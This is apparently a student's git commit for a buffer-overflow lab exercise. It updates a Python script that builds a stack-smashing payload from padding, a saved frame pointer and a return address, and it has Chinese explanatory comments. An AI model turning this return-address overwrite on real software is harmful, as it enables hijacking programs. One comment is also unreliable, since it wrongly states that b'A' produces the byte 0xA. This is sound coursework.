a89504a7bbde1b6d9bd9eeb789d8915fb90b78f5
ZnnnnnH2 <2024201540@ruc.edu.cn>
2026-01-15 00:05:11 +0800

    problem3 solved

--- script.py
+++ script.py
@@ -1,11 +1,12 @@
 # 比如你发现你可以使用'A'去覆盖8个字节，然后跳转到0x114514地址就可以完成任务，那么你可以这么写你的payload并保存
-padding = b"A" * 16
-func1_address = b"\x4c\x12\x40\x00\x00\x00\x00\x00"  # 小端地址
-payload = padding+ func1_address
+padding = b"A" * 32
+rbp = b"\x00\x38\x40\x00\x00\x00\x00\x00"  
+func1_address = b"\x2b\x12\x40\x00\x00\x00\x00\x00"  # 小端地址
+payload = padding+ rbp + func1_address
 # Write the payload to a file
-with open("ans2.txt", "wb") as f:
+with open("ans3.txt", "wb") as f:
     f.write(payload)
-print("Payload written to ans2.txt")
+print("Payload written to ans3.txt")
 #解释一下，为什么要将函数地址写成这个样子
 #比方说你希望将字节0xA放在栈上时，如果你的txt文件是可见字符'A'的话，实际上放到栈上的是字节0x41(可见字符'A'对应的ASCll码值)
 #但很明显，这不符合我们的预期，因此需要用关键字b去保证是0xA，比如b'A'，此时就是0xA，而不是可见字符'A'
